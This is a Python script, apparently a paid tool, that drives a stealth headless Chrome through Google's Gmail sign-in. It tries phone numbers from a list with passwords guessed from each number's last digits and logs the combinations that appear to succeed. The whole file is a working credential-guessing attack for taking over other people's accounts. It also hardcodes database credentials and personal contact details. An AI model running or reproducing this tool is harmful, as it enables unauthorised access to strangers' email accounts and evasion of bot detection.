from selenium.common.exceptions import NoSuchElementException
from multiprocessing import freeze_support
from selenium.webdriver.common.by import By
import undetected_chromedriver as uc
from time import sleep
import subprocess
import mysql.connector as connector
import os
import time
import colorama
from colorama import Fore

import os, time, getpass, random
from colorama import Fore
from undetected_chromedriver.v2 import v2 as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException, WebDriverException
import subprocess
import mysql.connector



class CodeMail:
    def __init__(self):
        print("""
    
░█████╗░░█████╗░██████╗░███████╗  ███╗░░░███╗░█████╗░██╗██╗░░░░░  ███████╗██╗███╗░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ████╗░████║██╔══██╗██║██║░░░░░  ██╔════╝██║████╗░██║██╔══██╗
██║░░╚═╝██║░░██║██║░░██║█████╗░░  ██╔████╔██║███████║██║██║░░░░░  █████╗░░██║██╔██╗██║██║░░██║
██║░░██╗██║░░██║██║░░██║██╔══╝░░  ██║╚██╔╝██║██╔══██║██║██║░░░░░  ██╔══╝░░██║██║╚████║██║░░██║
╚█████╔╝╚█████╔╝██████╔╝███████╗  ██║░╚═╝░██║██║░░██║██║███████╗  ██║░░░░░██║██║░╚███║██████╔╝
░╚════╝░░╚════╝░╚═════╝░╚══════╝  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚══════╝  ╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═════╝░
 Contact Me: +8801404853134 Or Skype: \"live:.cid.d97a1c0dec0ab0aa\" 

 """)
                #================================= create mail write folder and txt file ==============================
        try:    
            os.mkdir('Mail Result')
        except:
            pass
        p = os.listdir("Mail Result")
        if len(p) != 2:
            match_pass_file = open("Mail Result/Valid Number and Password.txt", "w")
            match_pass_file.close()
            list_number_file = open("Mail Result/Checked Number.txt", "w")
            list_number_file.close()

    
    def user_check(self):
        email = input("Enter Username: ")
        pswd = input("Enter Password: ")
        mydb = connector.connect( 
                host="bq8mfz696xff97nysptz-mysql.services.clever-cloud.com",
                port="3306",
                user="uiqoewkktle9zfmk",
                password="xgluGEb9sqAGqIH86j5h",
                database="bq8mfz696xff97nysptz"
            )
        mycursor = mydb.cursor()
        id_val = subprocess.check_output("wmic csproduct get uuid").decode().split("\n")[1].strip()
        queue = "SELECT * FROM `device_id` WHERE id = '{}'".format(id_val)
        mycursor.execute(queue)
        div_data = mycursor.fetchall()
        if div_data[0][0] == id_val:
            email_query = "SELECT * FROM `user_auth` WHERE email = '{}'".format(email)
            mycursor.execute(email_query)
            user_data = mycursor.fetchall()
            if user_data[0][1] == email  and pswd == user_data[0][2] and int(user_data[0][3]) == 1:
                print(f'{Fore.GREEN}Login successful{Fore.RESET}')
                return 1
            elif int(user_data[0][3]) != 1:
                return -3
            elif user_data[0][1] != email:
                return -1
            elif pswd == user_data[0][2]:
                return -4
        else:
            return -2

    

    def reloadfunc(self, driver):
        driver.delete_all_cookies()
        driver.get(r'https://accounts.google.com/signin/v2/identifier?continue='+\
                            'https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1'+\
                        '&flowName=GlifWebSignIn&flowEntry = ServiceLogin')
        sleep(1)
        
    def valid_number_pass(self, number, match_pass):
        with open("Mail Result/Valid Number and Password.txt", "a") as resultFile:
            resultFile.write(f"{number},{match_pass}\n")
            #Save Last Number
    def update_last(self, email):
        file = open('Last Number.txt', 'w')
        file.write(email)
        file.close()
    

    def startfun(self, numbers, limit, pswDig):
        option = uc.ChromeOptions()
        option.add_argument("--incognito")
        option.add_argument('--headless')
        driver = uc.Chrome(options=option)
        action = ActionChains(driver)
        self.reloadfunc(driver)
        for i in range(limit):
            with open(num_file, "r") as file:
                number = file.readline()
                lines = file.readlines()
            with open(num_file, "w") as file:
                for line in lines:
                    file.write(line)
            with open("Mail Result/Checked Number.txt", "a") as outherNum:
                outherNum.write(f"{number}\n")
            try:
                sleep(1)
                mail_box = driver.find_element(By.XPATH, '//*[@id="identifierId"]')
                mail_box.clear()
                action.move_to_element(mail_box).click_and_hold().pause(0).send_keys(number).perform()
                # driver.find_element(By.XPATH, '//*[@id="identifierNext"]/div/button').click() 
                self.update_last(number)
                time.sleep(2)
                print(f'{Fore.RED}{number}{Fore.RESET}')
            except:
                self.reloadfunc(driver)
                continue
            try:
                check_mail = driver.find_element(By.XPATH, '//div[2]/div[2]/div').is_displayed()
                if not check_mail:
                    print(Fore.RED , number)
                    match_pass = 0
                    print(f'{Fore.GREEN}{number}{Fore.RESET}')
                    time.sleep(1)
                    WebDriverWait(driver, 3).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="password"]/div[1]/div/div[1]/input'))).send_keys(number[-pswDig:])
                    driver.find_element(By.XPATH, '//*[@id="passwordNext"]/div/button').click()
                    time.sleep(1)
                    match_pass = number[-pswDig:]
                    if driver.find_element(By.XPATH, '//*[@id="smsButton"]/div/button/span'):
                        print(f'{Fore.YELLOW}{number}{Fore.RESET}')
                        self.valid_number_pass(number, match_pass)
                        self.reloadfunc(driver)
                        continue
                    else:
                        sleep(1)
                        try:
                            check_pass = driver.find_element(By.XPATH, '//section/div/div/div/div[2]').is_displayed()
                            if not check_pass:
                                try: 
                                    check_cap = driver.find_element(By.XPATH, "//input[@id='ca']").is_displayed()
                                    if check_cap:
                                        self.reloadfunc(driver)
                                        print(f'{Fore.GREEN}{number}{Fore.RESET}')
                                        continue
                                    else:
                                        self.valid_number_pass(number, match_pass)
                                        self.reloadfunc(driver)
                                        continue
                                except NoSuchElementException:
                                    self.valid_number_pass(number, match_pass)
                                    self.reloadfunc(driver)
                                    continue
                        except NoSuchElementException:
                            try: 
                                check_cap = driver.find_element(By.XPATH, "//input[@id='ca']").is_displayed()
                                if check_cap:
                                    self.reloadfunc(driver)
                                    continue
                                else:
                                    try:
                                        check_pass2 = driver.find_element(By.XPATH, "//div[@id='view_container']/div/div/div[2]/div/div/div/form/span/section/div/div/div[2]/div[2]/div[2]/span")
                                        val = check_pass2.is_displayed()
                                        if val == False:
                                            self.valid_number_pass(number, match_pass)
                                            self.reloadfunc(driver)
                                            continue
                                    except NoSuchElementException:
                                        # self.valid_number_pass(number, match_pass, '5')
                                        self.reloadfunc(driver)
                                        continue
                            except NoSuchElementException:
                                self.valid_number_pass(number, match_pass)
                                self.reloadfunc(driver)
                                continue
            except Exception as ex:
                self.reloadfunc(driver)
                continue
        driver.quit()



if __name__ == '__main__':
    freeze_support() 
    obj = CodeMail()
    os.system("Color 0A")
    for i in range(3):
        # user_auth = obj.user_check()
        if 1 == 1:
            while True:
                num_file= input("Enter the name of the file: ")
                with open(num_file, "r") as file:
                    number = file.readline()
                    lines = file.readlines()

                with open(num_file, "w") as file:
                    for line in lines:
                        file.write(line)
                limit = input("Check Limit   : ")
                pswDig = input("Password Digit: ")
                if not num_file or not limit or not pswDig:
                    continue
                else:
                    obj.startfun(number, int(limit), int(pswDig))
        elif user_auth == -2:
            print("The software is not for your device. Contact : \''01404853134\'' or Skype: \''live:.cid.d97a1c0dec0ab0aa\'' ,to get the software for your device")
        elif user_auth == -3:
            print("The software is not for your device. Contact : \''01404853134\'' or Skype: \''live:.cid.d97a1c0dec0ab0aa\'' ,to get the software for your device")
        elif user_auth == -1:
            print("The software is not for your device. Contact : \''01404853134\'' or Skype: \''live:.cid.d97a1c0dec0ab0aa\'' ,to get the software for your device")
        else:
            print("Password Wrong")


